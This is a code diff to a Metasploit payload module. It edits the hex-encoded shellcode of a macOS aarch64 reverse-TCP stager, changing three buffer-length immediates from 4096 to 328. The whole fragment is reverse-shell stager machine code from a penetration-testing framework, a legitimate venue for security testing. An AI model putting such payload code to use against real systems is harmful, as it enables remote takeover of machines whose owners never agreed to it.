@@ -45,7 +45,7 @@ module MetasploitModule
       # Generated from external/source/shellcode/osx/aarch64/stager_sock_reverse.s
       # <_main>:
       0xaa1f03e0, # mov	x0, xzr
-      0xd2820001, # mov	x1, #4096
+      0xd2802901, # mov	x1, #328
       0xd2800042, # mov	x2, #2
       0xd2820043, # mov	x3, #4098
       0xaa3f03e4, # mvn	x4, xzr
@@ -74,14 +74,14 @@ module MetasploitModule
       0xd4000001, # svc	#0
       0xaa0d03e0, # mov	x0, x13
       0xaa0c03e1, # mov	x1, x12
-      0xd2820002, # mov	x2, #4096
+      0xd2802902, # mov	x2, #328
       0xd2800803, # mov	x3, #64
       0xaa1f03e4, # mov	x4, xzr
       0xaa1f03e5, # mov	x5, xzr
       0x58000530, # ldr	x16, 0x100003f98 <sleep_seconds+0x20>
       0xd4000001, # svc	#0
       0xaa0c03e0, # mov	x0, x12
-      0xd2820001, # mov	x1, #4096
+      0xd2802901, # mov	x1, #328
       0xd28000a2, # mov	x2, #5
       0x580004d0, # ldr	x16, 0x100003fa0 <sleep_seconds+0x28>
       0xd4000001, # svc	#0
